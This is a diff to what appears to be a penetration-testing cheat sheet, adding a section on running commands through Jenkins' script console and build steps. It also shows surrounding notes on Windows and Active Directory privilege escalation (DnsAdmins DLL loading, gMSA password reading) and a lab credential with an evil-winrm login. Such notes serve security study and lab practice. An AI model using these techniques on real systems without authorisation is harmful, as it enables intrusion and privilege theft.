@@ -246,6 +246,7 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [Write privileges](#write-privileges)
     - [Services running - Autorun](#services-running---autorun)
     - [CEF Debugging Background](#cef-debugging-background)
+    - [Feature Abuse](#feature-abuse)
   - [Buffer Overflow](#buffer-overflow)
   - [Antivirus Evasion](#antivirus-evasion)
     - [ToDo](#todo)
@@ -5713,7 +5714,7 @@ Other
 
 - [Privileged Groups | HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges)
 
-#### DnsAdmins
+##### DnsAdmins
 - https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/
 - `dnscmd.exe /config /serverlevelplugindll \\path\to\dll`
   - as a dll, try to use 'dns-exe-persistance.dll'
@@ -5725,7 +5726,7 @@ Other
   2. `sc.exe stop dns`
   3. `sc.exe start dns`
   
-#### gMSA
+##### gMSA
 - If your user is part of a group in 'PrincipalsAllowedToRetrieveManagedPassword'
   .\GMSAPasswordReader.exe --accountname 'svc_apache'
 - Retrieve 'rc4_hmac' in Current Value
@@ -5733,7 +5734,7 @@ Other
 - See accounts for Group Managed Service Account (gMSA) with Powershell
   Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
 
-#### AD Recycle Bin
+##### AD Recycle Bin
 - It's a well-known Windows group. Check if your user is in this group
 - Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
 - Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
@@ -6201,6 +6202,25 @@ A symbolic link is a file object that points to another file object. The object 
 - See the process: https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html#priv-tushikikatomo--cyork
 
 
+#### <ins>Feature Abuse</ins>
+
+Note: In the Windows environment, numerous enterprise applications often require either administrative privileges or SYSTEM privileges, presenting significant opportunities for privilege escalation.
+
+##### Jenkins
+You can run system commands. There are many ways to do it:
+- With plugins installed (from [CRTP](https://www.alteredsecurity.com/adlab))
+- With admin access, go to `http://<jenkins_server>/script` and run the following:
+  ```PowerShell
+  def sout = new StringBuffer(), serr = new StringBuffer()
+  def proc = '
+  [INSERT COMMAND]'.execute()
+  proc.consumeProcessOutput(sout, serr)
+  proc.waitForOrKill(1000)
+  println "out> $sout err> $serr"
+  ```
+- If you don't have admin access but could add or edit build steps in the build configuration. Add a build step, add "Execute Windows Batch Command" and enter: `powershell -c <command>`
+
+
 
 ### <ins>Buffer Overflow</ins>
 
@@ -6610,6 +6630,7 @@ For Mimikatz, make the following changes:
 - NTLM Auth: https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html#beyond-root---ntlm-auth
 - Not all the usernames found are always the ones that work. For example: you might find autologon creds `svc_loanmanager:Moneymakestheworldgoround!` which however lead to login with `evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'`
 - Every time that you think about Active Directory, think about a Forest, not a Domain. If one domain is compromised, so it is the entire forest. Whithin a forest, all the domains trust each others. This is why a forest is considered a security boundry.
+- Making changes to the local administrator group is one of the noisiest thing you can do
 
 
 #### <ins>Initial foothold</ins>
